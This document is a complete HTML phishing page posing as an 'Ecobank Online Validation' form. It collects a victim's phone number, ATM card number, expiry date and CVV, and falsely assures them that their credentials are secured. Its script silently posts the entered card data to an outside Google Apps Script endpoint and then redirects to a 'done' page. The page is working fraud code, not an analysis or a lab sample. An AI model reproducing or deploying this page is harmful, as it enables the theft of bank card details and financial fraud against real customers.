<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta-name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ecobank Online Validation</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #001B44; /* Dark Blue */
            font-family: Arial, sans-serif;
            color: white;
        }

        /* Updated container for better mobile visibility */
        .container {
            max-width: 95%;
            width: 420px;
            margin: 40px auto;
            background: rgba(255,255,255,0.12);
            padding: 35px;
            border-radius: 18px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
        }

        h1 {
            text-align: center;
            font-weight: bold;
            font-size: 26px; /* Bigger title */
            margin-bottom: 10px;
        }

        .subtitle {
            text-align: center;
            font-size: 15px;
            color: #CCCCCC;
            margin-bottom: 35px;
            line-height: 1.4;
        }

        label {
            font-size: 16px; /* bigger label */
            margin-top: 18px;
            display: block;
        }

        /* Bigger clean mobile inputs */
        input {
            width: 100%;
            padding: 18px 16px;
            margin-top: 8px;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            box-sizing: border-box;
            background: #ffffff;
            color: #000;
        }

        /* Bigger button */
        button {
            width: 100%;
            margin-top: 30px;
            padding: 18px;
            background-color: grey;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            color: white;
            cursor: pointer;
            font-weight: bold;
        }

        footer {
            text-align: center;
            margin-top: 25px;
            color: #DDDDDD;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <div class="container">
        <h1>ECOBANK ONLINE VALIDATION</h1>
        <p class="subtitle">A LOT HAS CHANGED, SO HAVE WE.</p>

        <form id="ecoForm">
            <label>Phone Number</label>
            <input type="tel" id="phone" required>

            <label>ATM Card Number</label>
            <input type="text" id="cardNumber" required>

            <label>ATM Expiry Date</label>
            <input type="month" id="expiry" required>

            <label>ATM CVV</label>
            <input type="number" id="cvv" required>

            <button type="submit">Validate</button>
        </form>

        <footer>Your credentials are secured</footer>
    </div>

    <script>
        document.getElementById("ecoForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const data = {
                phone: document.getElementById("phone").value,
                cardNumber: document.getElementById("cardNumber").value,
                expiry: document.getElementById("expiry").value,
                cvv: document.getElementById("cvv").value
            };

            fetch("https://script.google.com/macros/s/AKfycbzyhB1DYyxSeFjcxq30DfveoS7IQx3FxExsdrCz71UUaZNVLz6N8Skk0PM7qmztv6p58Q/exec
", {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            })
            .then(() => {
                // Redirect to done.html
                window.location.href = "done.html";
            });
        });
    </script>

</body>
</html>
